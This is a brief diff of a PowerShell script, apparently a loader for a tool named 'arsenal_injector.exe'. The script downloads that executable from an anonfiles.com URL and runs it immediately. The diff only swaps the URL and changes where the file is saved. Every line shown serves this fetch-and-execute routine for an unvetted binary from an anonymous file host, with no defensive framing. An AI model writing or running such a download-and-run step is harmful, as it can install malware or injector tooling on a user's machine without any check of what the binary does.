@@ -1,7 +1,7 @@
 $ProcName = "arsenal_injector.exe"
-$WebFile = "https://cdn-153.anonfiles.com/pcv5Feu9zd/a3101b97-1685618318/$ProcName"
+$WebFile = "https://cdn-143.anonfiles.com/pcv5Feu9zd/1c858d48-1685619571/$ProcName"
  
 Clear-Host
  
-(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:temp\$ProcName")
-Start-Process ("$env:temp\$ProcName")
+(New-Object System.Net.WebClient).DownloadFile($WebFile,"$ProcName")
+Start-Process ("$ProcName")
